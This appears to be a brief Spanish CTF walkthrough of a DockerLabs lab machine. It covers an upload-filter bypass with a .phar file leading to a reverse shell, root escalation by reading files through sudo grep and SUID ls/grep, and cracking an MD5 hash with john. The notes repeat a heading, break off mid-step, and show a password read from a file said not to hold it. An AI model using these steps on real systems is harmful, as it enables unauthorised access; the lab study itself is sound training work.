PORT   STATE SERVICE
80/tcp open  http

-Entramos al puerto 80 y es un calco de la web de Dockerlabs

-Hacemos fuzzing y encontramos la ruta /machine.php, donde podemos subir un archivo .zip como si fuera una máquina

-Nos saltamos la restricción subiendo una archivo .phar , que es la extensión utilizada para comprimir archivos .php 

-Ejecutamos el archivo subido en la ruta /uploads y recibimos la reverse shell

www-data@7024cfe86ca2:/$

## Escalada de Privilegios

-sudo -l
	(root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep

-Buscamos en Gtfobins y los dos binarios nos permiten leer cualquier archivo

-Buscamos por la máquina algún archivo que pueda tener la contraseña de root

-Lo encontramos en la siguiente ruta:
	/opt/nota.txt
	-cat nota.txt:
		Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
-Abusamos de /usr/bin/grep para leer su contenido:
	LFILE=/opt/nota.txt
	sudo grep '' $LFILE
	dockerlabsmolamogollon123
-Nos autenticamos como root con la contraseña obtenida:
	su root
	dockerlabsmolamogollon123
	root@7024cfe86ca2:/opt# whoami
	root


## Escalada de Privilegios

-Buscamos binarios con permisos SUID:
	/usr/bin/ls , /usr/bin/grep

-Vemos el contenido de la carpeta /root y vemos el contenido del archivo:
	-/usr/bin/ls /root
		pass.hash
	-grep '' /root/pass.hash
	e43833c4c9d5ac444e16bb94715a75e4

-Lo rompemos con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
		spongebob34

-Pivotamos al usuario root:
	